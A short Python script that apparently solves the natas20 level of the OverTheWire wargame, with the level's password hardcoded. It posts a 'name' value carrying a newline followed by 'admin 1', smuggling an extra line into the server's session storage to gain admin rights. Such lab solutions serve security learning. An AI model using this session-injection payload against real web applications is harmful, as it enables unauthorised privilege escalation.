#!/usr/bin python

import requests
import re

username = 'natas20'
password = 'eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF'

url = 'http://%s.natas.labs.overthewire.org/?debug' % username

session = requests.Session()

response = session.get(url, auth= ( username, password ))
print(response.text)
print("="*80)

response = session.post(url, data= { "name": "arthur\nadmin 1" }, auth= (  username, password ))
print(response.text)
print("="*80)

response = session.get(url, auth= ( username, password ))
print(response.text)
print("="*80)
